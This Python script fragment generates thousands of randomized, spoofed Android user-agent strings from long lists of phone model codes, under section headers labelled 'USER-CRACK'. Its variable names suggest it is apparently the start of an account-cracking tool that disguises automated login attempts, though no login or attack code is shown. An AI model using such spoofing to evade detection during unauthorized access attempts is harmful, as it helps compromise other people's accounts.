#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  
infinix = random.choice(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])

for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(5, 13)
	c='Build/'
	d='0'
	e=random.randrange(1,13)
	f='0'
	g=random.randrange(8,20)
	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	i=random.randrange(73,112)
	j='0'
	k=random.randrange(4200,4900)
	l=random.randrange(40,150)
	m='Mobile Safari/534.36'
	uaku=(f'{a} {b}; {infinix} {c}{d}{e}{f}{g}) {h}{i}.{j}.{k}.{l} {m}')
	ugen.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 4.0.3'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='U9200)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 2.3.5;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='it-de; HTC/Explorer/1.17.161.3 Build/GRJ90; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/264.0.0.23.120;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 4.4.2'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Micromax A82)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 2.3.5;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='it-de; HTC/Explorer/1.17.161.3 Build/GRJ90; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'aG', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/264.0.0.23.120;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 4.0.4'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Galaxy Nexus Build/IMM76B)'
	g='AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	

#----------[ USER-CRACK ]----------#  

for xd in range(10000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    andro = str(rc(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13']))
    iphone = str(rc(['17_0','15_2','16_6','17_1','13_4']))
    iphone = str(rc(['Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profil/Konfigurasi MIDP-2.1/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, seperti Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4']))
    iphone = str(rc(['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H']))
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    build_nokiax = ['JDQ39','JZO54K']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
